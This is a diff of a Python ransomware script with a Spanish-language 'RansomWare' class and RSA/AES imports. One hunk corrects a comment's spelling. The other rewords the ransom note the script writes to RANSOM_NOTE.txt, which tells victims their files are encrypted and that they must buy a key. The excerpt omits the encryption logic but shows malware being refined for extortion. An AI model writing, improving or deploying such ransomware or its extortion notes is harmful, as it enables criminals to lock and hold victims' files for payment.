@@ -13,7 +13,7 @@ from Crypto.PublicKey import RSA # algoritmo
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 import base64
-import threading # se usara para colocar la clave y desencriyat el sistema
+import threading # se usara para colocar la clave y desencriptar el sistema
 
 
 
@@ -149,7 +149,7 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-Los discos duros de su computadora y sus archivos han sido encriptados con un algoritmo de encriptación alto grado.
+Los archivos de su ordenador han sido encriptados con un algoritmo de encriptación alto grado.
 No podrá restaurar sus datos sin una clave.
 
 Para comprar la clave y restaurar su equipo, siga esta instrucciones:
